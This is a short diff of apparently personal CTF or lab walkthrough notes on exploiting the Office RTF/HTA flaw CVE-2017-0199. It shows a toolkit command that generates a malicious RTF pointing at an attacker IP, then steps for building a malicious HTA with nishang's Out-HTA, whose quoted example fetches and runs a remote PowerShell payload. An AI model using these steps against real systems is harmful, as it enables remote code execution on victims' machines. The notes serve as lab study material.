@@ -75,3 +75,23 @@ python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u http://10.10.16.20 -t RTF
 we are using -x 0 cuz we don't want any obfuscation
 ![[Pasted image 20240509131543.png]]
 
+Now we have to generate a Malicious HTA file cuz that the requirement in order to work.
+![[Pasted image 20240509131659.png]]
+
+I have clone nishang
+https://github.com/samratashok/nishang
+
+```
+find . | grep -i hta
+```
+![[Pasted image 20240509131932.png]]
+
+```
+less ./Client/Out-HTA.ps1
+```
+![[Pasted image 20240509132014.png]]
+
+```
+.EXAMPLE
+PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1
+```
